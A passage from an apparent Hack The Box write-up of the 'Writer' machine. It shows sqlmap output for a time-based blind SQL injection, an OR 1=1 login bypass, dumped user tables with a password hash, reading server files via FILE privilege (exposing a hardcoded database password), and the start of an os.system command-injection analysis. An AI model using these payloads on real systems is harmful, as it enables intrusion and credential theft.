[14:41:29] [INFO] target URL appears to be UNION injectable with 6 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[14:41:45] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[14:41:45] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 121 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[14:42:08] [INFO] the back-end DBMS is MySQL
[14:42:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:42:17] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'

[*] ending @ 14:42:17 /2021-10-02/
```

The login form's `uname` parameter is vulnerable to time-based blind SQL injection. As a result, it is probably also vulnerable to authentication bypass. The request:

```http
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: http://10.10.11.101
DNT: 1
Connection: close
Referer: http://10.10.11.101/administrative
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

uname=admin%27+OR+1%3D1%3B--&password=blah
```

This grants access to the administrative panel.

![](images/Pasted%20image%2020211002152941.png)

#### Dumping Tables

Exploit the time-based blind SQL injection vulnerability to determine the current database.

```bash
$ sqlmap -r login-request.txt --dbms=mysql --current-db
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:50:29 /2021-10-02/

[14:50:29] [INFO] parsing HTTP request from 'login-request.txt'
[14:50:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[14:50:30] [INFO] testing MySQL
[14:50:30] [INFO] confirming MySQL
[14:50:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[14:50:30] [INFO] fetching current database
[14:50:30] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[14:50:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[14:50:50] [INFO] adjusting time delay to 1 second due to good response times
writer
current database: 'writer'
[14:51:09] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'

[*] ending @ 14:51:09 /2021-10-02/
```

The current database is named `writer`. Determine its tables.

```bash
$ sqlmap -r login-request.txt --dbms=mysql -D writer --tables
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:52:35 /2021-10-02/

[14:52:35] [INFO] parsing HTTP request from 'login-request.txt'
[14:52:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[14:52:35] [INFO] testing MySQL
[14:52:35] [INFO] confirming MySQL
[14:52:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[14:52:35] [INFO] fetching tables for database: 'writer'
[14:52:35] [INFO] fetching number of tables for database 'writer'
[14:52:35] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[14:52:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[14:53:05] [INFO] adjusting time delay to 2 seconds due to good response times
3
[14:53:05] [INFO] retrieved: site
[14:53:31] [INFO] retrieved: stories
[14:54:12] [INFO] retrieved: users
Database: writer
[3 tables]
+---------+
| site    |
| stories |
| users   |
+---------+

[14:54:44] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'

[*] ending @ 14:54:44 /2021-10-02/
```

`site`, `stories`, and `users`. `users` appears to be the most interesting. Determine its columns.

```bash
$ sqlmap -r login-request.txt --dbms=mysql -D writer -T users --columns
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.8#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:56:18 /2021-10-02/

[14:56:18] [INFO] parsing HTTP request from 'login-request.txt'
[14:56:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[14:56:18] [INFO] testing MySQL
[14:56:18] [INFO] confirming MySQL
[14:56:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[14:56:18] [INFO] fetching columns for table 'users' in database 'writer'
[14:56:18] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[14:56:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[14:56:38] [INFO] adjusting time delay to 1 second due to good response times
6
[14:56:38] [INFO] retrieved: id
[14:56:46] [INFO] retrieved: int(11)
[14:57:14] [INFO] retrieved: username
[14:57:41] [INFO] retrieved: varchar(255)
[14:58:23] [INFO] retrieved: password
[14:58:53] [INFO] retrieved: varchar(255)
[14:59:36] [INFO] retrieved: email
[14:59:51] [INFO] retrieved: varchar(255)
[15:00:33] [INFO] retrieved: status
[15:00:55] [INFO] retrieved: varchar(255)
[15:01:37] [INFO] retrieved: date_created
[15:02:18] [INFO] retrieved: timestamp
Database: writer
Table: users
[6 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| date_created | timestamp    |
| email        | varchar(255) |
| id           | int(11)      |
| password     | varchar(255) |
| status       | varchar(255) |
| username     | varchar(255) |
+--------------+--------------+

[15:02:51] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'

[*] ending @ 15:02:51 /2021-10-02/
```

Dump the table.

```bash
$ sqlmap -r login-request.txt --dbms=mysql -D writer -T users --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:03:46 /2021-10-02/

[15:03:46] [INFO] parsing HTTP request from 'login-request.txt'
[15:03:46] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[15:03:46] [INFO] testing MySQL
[15:03:46] [INFO] confirming MySQL
[15:03:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[15:03:46] [INFO] fetching columns for table 'users' in database 'writer'
[15:03:46] [INFO] resumed: 6
[15:03:46] [INFO] resumed: id
[15:03:46] [INFO] resumed: username
[15:03:46] [INFO] resumed: password
[15:03:46] [INFO] resumed: email
[15:03:46] [INFO] resumed: status
[15:03:46] [INFO] resumed: date_created
[15:03:46] [INFO] fetching entries for table 'users' in database 'writer'
[15:03:46] [INFO] fetching number of entries for table 'users' in database 'writer'
[15:03:46] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[15:03:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
1
[15:04:27] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[15:04:39] [INFO] adjusting time delay to 1 second due to good response times

[15:04:44] [INFO] retrieved: admin@writer.htb
[15:05:44] [INFO] retrieved: 1
[15:05:46] [INFO] retrieved: 118e48794631a9612484ca8b55f622d
[15:07:48] [ERROR] invalid character detected. retrying..
[15:07:48] [WARNING] increasing time delay to 2 seconds
0
[15:08:03] [INFO] retrieved: Active
[15:08:38] [INFO] retrieved: admin
[15:09:08] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[15:09:41] [INFO] writing hashes to a temporary file '/tmp/sqlmap1mbith1a198187/sqlmaphashes-q27u9g_d.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: writer
Table: users
[1 entry]
+----+------------------+--------+----------------------------------+----------+--------------+
| id | email            | status | password                         | username | date_created |
+----+------------------+--------+----------------------------------+----------+--------------+
| 1  | admin@writer.htb | Active | 118e48794631a9612484ca8b55f622d0 | admin    | NULL         |
+----+------------------+--------+----------------------------------+----------+--------------+

[15:09:47] [INFO] table 'writer.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/10.10.11.101/dump/writer/users.csv'
[15:09:47] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'

[*] ending @ 15:09:47 /2021-10-02/
```

`admin`'s MD5 password hash is `118e48794631a9612484ca8b55f622d0`. However, it is not crackable using rockyou.txt and OneRuleToRuleThemAll.rule.

Columns in the `stories` table:

```bash
$ sqlmap -r login-request.txt --dbms=mysql -D writer -T stories --columns
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.8#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:40:08 /2021-10-02/

[15:40:08] [INFO] parsing HTTP request from 'login-request.txt'
[15:40:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[15:40:08] [INFO] testing MySQL
[15:40:08] [INFO] confirming MySQL
[15:40:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[15:40:08] [INFO] fetching columns for table 'stories' in database 'writer'
[15:40:08] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[15:40:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[15:40:50] [INFO] adjusting time delay to 1 second due to good response times
8
[15:40:51] [INFO] retrieved: id
[15:40:58] [INFO] retrieved: int(11)
[15:41:26] [INFO] retrieved: author
[15:41:49] [INFO] retrieved: text
[15:42:07] [INFO] retrieved: title
[15:42:27] [INFO] retrieved: text
[15:42:46] [INFO] retrieved: tagline
[15:43:10] [INFO] retrieved: text
[15:43:28] [INFO] retrieved: content
[15:43:58] [INFO] retrieved: text
[15:44:16] [INFO] retrieved: status
[15:44:39] [INFO] retrieved: text
[15:44:57] [INFO] retrieved: date
[15:45:11] [INFO] retrieved: timestamp
[15:45:43] [INFO] retrieved: image
[15:45:57] [INFO] retrieved: text
Database: writer
Table: stories
[8 columns]
+---------+-----------+
| Column  | Type      |
+---------+-----------+
| date    | timestamp |
| author  | text      |
| content | text      |
| id      | int(11)   |
| image   | text      |
| status  | text      |
| tagline | text      |
| title   | text      |
+---------+-----------+

[15:46:15] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'

[*] ending @ 15:46:15 /2021-10-02/
```

Current database user's privileges:

```bash
$ sqlmap -r login-request.txt --current-user --privileges
┌─[user@parrot]─[~/workspace/htb/boxes/writer]
└──╼ $ sqlmap -r login-request.txt --current-user --privileges
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:48:29 /2021-10-02/

[15:48:29] [INFO] parsing HTTP request from 'login-request.txt'
[15:48:29] [INFO] resuming back-end DBMS 'mysql'
[15:48:29] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[15:48:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL 5 (MariaDB fork)
[15:48:29] [INFO] fetching current user
[15:48:29] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[15:48:55] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
a
[15:49:06] [INFO] adjusting time delay to 1 second due to good response times
dmin@localhost
current user: 'admin@localhost'
[15:49:57] [INFO] fetching database users privileges
[15:49:57] [INFO] fetching database users
[15:49:57] [INFO] fetching number of database users
[15:49:57] [INFO] retrieved: 1
[15:49:59] [INFO] retrieved: 'admin'@'loc
[15:50:50] [ERROR] invalid character detected. retrying..
[15:50:50] [WARNING] increasing time delay to 2 seconds
alhost'
[15:51:44] [INFO] fetching number of privileges for user 'admin'
[15:51:44] [INFO] retrieved: 1
[15:51:46] [INFO] fetching privileges for user 'admin'
[15:51:46] [INFO] retrieved: FILE
database management system users privileges:
[*] %admin% [1]:
    privilege: FILE

[15:52:10] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'

[*] ending @ 15:52:10 /2021-10-02/
```

The current user, `admin`, has `FILE` permission. The target web server is Apache. Retrieve the Apache default enabled sites configuration file, `/etc/apache2/sites-enabled/000-default.conf`.

```bash
$ sqlmap -r login-request.txt --file-read=/etc/apache2/sites-enabled/000-default.conf
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.8#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:07:55 /2021-10-02/

[17:07:55] [INFO] parsing HTTP request from 'login-request.txt'
[17:07:55] [INFO] resuming back-end DBMS 'mysql'
[17:07:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[17:07:56] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL 5 (MariaDB fork)
[17:07:56] [INFO] fingerprinting the back-end DBMS operating system
[17:07:56] [INFO] the back-end DBMS operating system is Linux
[17:07:56] [INFO] fetching file: '/etc/apache2/sites-enabled/000-default.conf'
[17:07:56] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
...[SNIP]...
'/home/user/.local/share/sqlmap/output/10.10.11.101/files/_etc_apache2_sites-enabled_000-default.conf' (204B)
files saved to [1]:
[*] /home/user/.local/share/sqlmap/output/10.10.11.101/files/_etc_apache2_sites-enabled_000-default.conf (size differs from remote file)
[17:26:37] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'
[*] ending @ 17:26:37 /2021-10-02/
```

```txt
# Virtual host configuration for writer.htb domain
<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
```

The [`WSGIScriptAlias`](https://modwsgi.readthedocs.io/en/develop/configuration-directives/WSGIScriptAlias.html) line indicates that all requests are processed by the WSGI script `/var/www/writer.htb/writer.wsgi`. This indicates that the Apache server is using `mod_wsgi`, which means the backend application code is written in Python. Read this file.

```bash
$ sqlmap -r login-request.txt --file-read=/var/www/writer.htb/writer.wsgi
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:34:36 /2021-10-02/

[17:34:36] [INFO] parsing HTTP request from 'login-request.txt'
[17:34:36] [INFO] resuming back-end DBMS 'mysql'
[17:34:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[17:34:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL 5 (MariaDB fork)
[17:34:37] [INFO] fingerprinting the back-end DBMS operating system
[17:34:37] [INFO] the back-end DBMS operating system is Linux
[17:34:37] [INFO] fetching file: '/var/www/writer.htb/writer.wsgi'
[17:34:37] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
...[SNIP]...
[*] /home/user/.local/share/sqlmap/output/10.10.11.101/files/_var_www_writer.htb_writer.wsgi (same file)
[18:10:20] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'
[*] ending @ 18:10:20 /2021-10-02/
```

```python
#!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/writer.htb/")

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get("SECRET_KEY", "")
```

The backend web application is a [Flask](https://flask.palletsprojects.com/en/2.0.x/) application. This WSGI entrypoint sets up logging to `stderr`, prepends `/var/www/writer.htb/` to `$PATH`, and imports the application from `/var/www/writer.htb/writer/__init__.py`. Read this file.

```bash
$ sqlmap -r login-request.txt --file-read=/var/www/writer.htb/writer/__init__.py
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:14:13 /2021-10-02/

[18:14:13] [INFO] parsing HTTP request from 'login-request.txt'
[18:14:14] [INFO] resuming back-end DBMS 'mysql'
[18:14:14] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7365 FROM (SELECT(SLEEP(5)))Egus) AND 'LVQy'='LVQy&password=password
---
[18:14:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL 5 (MariaDB fork)
[18:14:14] [INFO] fingerprinting the back-end DBMS operating system
[18:14:14] [INFO] the back-end DBMS operating system is Linux
[18:14:14] [INFO] fetching file: '/var/www/writer.htb/writer/__init__.py'
[18:14:14] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[18:14:16] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
6
...[SNIP]...
[*] /home/user/.local/share/sqlmap/output/10.10.11.101/files/_var_www_writer.htb_writer___init__.py
[10:57:19] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/10.10.11.101'
[*] ending @ 10:57:19 /2021-10-03/
```

```python
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return ("Something is wrong with your db user name or password!")
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return ("Database does not exist")
        else:
            return ("Another exception, returning!")
    else:
        print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
    return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
    return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    sql_command = "SELECT * FROM stories;"
    cursor.execute(sql_command)
    stories = cursor.fetchall()
    return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
    if not ('user' in session):
        return redirect('/')
    return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    cursor = connector.cursor()
    sql_command = "Select * From stories;"
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image)
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        cursor = connector.cursor()
        cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id}
...[END OF SOURCE RETRIEVED]...
```

Since the SQL injection vulnerability is blind, it took quite a while to read this file and eventually, it failed. However, it did retrieve a majority of the file. This files appears to contain all of the application's endpoints. Going through the endpoints, the `add_story()` endpoint at `/dashboard/stories/add` appears to pass user input into operating system commands. Investigate this further.

---

## Add Story Endpoint Command Injection

```python
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib
...[SNIP]...
@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
    if not ('user' in session):
        return redirect('/')
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return ("Database error")
    if request.method == "POST":
        if request.files['image']:
            image = request.files['image']
            if ".jpg" in image.filename:
                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
                image.save(path)
                image = "/img/{}".format(image.filename)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))  # OS COMMAND #1
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image)
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image)) # OS COMMAND #2
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image)) # OS COMMAND #3
                        error = "Not a valid image file!"
                        return render_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render_template('add.html', error=error)
        author = request.form.get('author')
        title = request.form.get('title')
        tagline = request.form.get('tagline')
        content = request.form.get('content')
        cursor = connector.cursor()
        cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
        result = connector.commit()
        return redirect('/dashboard/stories')
    else:
        return render_template('add.html')
```

This endpoint is invoked whenever a user attempts to add a story. This is possible through the administrative panel.

The endpoint contains three operating system command calls, which have been labelled accordingly. It appears that the purpose of these calls is to save an image for the story on disk.

The endpoint first ensures that the request is a `POST` request.

It then ensures that the request's image's `filename` contains the string `.jpg` (anywhere). It then saves the file to the `/var/www/writer.htb/writer/static/img/` directory.

